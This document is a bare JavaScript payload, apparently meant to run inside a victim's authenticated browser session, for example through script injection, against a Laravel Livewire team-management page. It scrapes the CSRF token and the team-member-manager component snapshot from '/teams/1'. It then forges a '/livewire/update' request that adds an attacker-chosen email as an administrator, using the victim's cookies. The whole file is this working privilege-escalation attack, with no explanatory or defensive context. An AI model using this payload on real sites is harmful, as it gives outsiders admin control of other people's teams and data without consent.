(async () => {
  const res = await fetch('/teams/1', { credentials: 'include' });
  const html = await res.text();

  const token = html.match(/<meta name="csrf-token" content="([^"]+)"/)?.[1];

  // Match the right component snapshot (teams.team-member-manager)
  const snapshots = [...html.matchAll(/wire:snapshot="([^"]+)"/g)];

  let snapshot = null;
  for (const [, snapRaw] of snapshots) {
    const snap = snapRaw.replaceAll('&quot;', '"');
    if (snap.includes('"teams.team-member-manager"')) {
      snapshot = snapRaw;
      break;
    }
  }

  if (!token || !snapshot) {
    console.warn('Token or correct snapshot not found');
    return;
  }

  const decodedSnapshot = snapshot.replaceAll('&quot;', '"');

  const postData = {
    _token: token,
    components: [{
      snapshot: decodedSnapshot,
      updates: {
        "addTeamMemberForm.email": "<<<EMAIL>>>",
        "addTeamMemberForm.role": "administrator"
      },
      calls: [{
        path: "",
        method: "addTeamMember",
        params: []
      }]
    }]
  };

  const r = await fetch('/livewire/update', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(postData)
  });

  console.log(await r.text());
})();
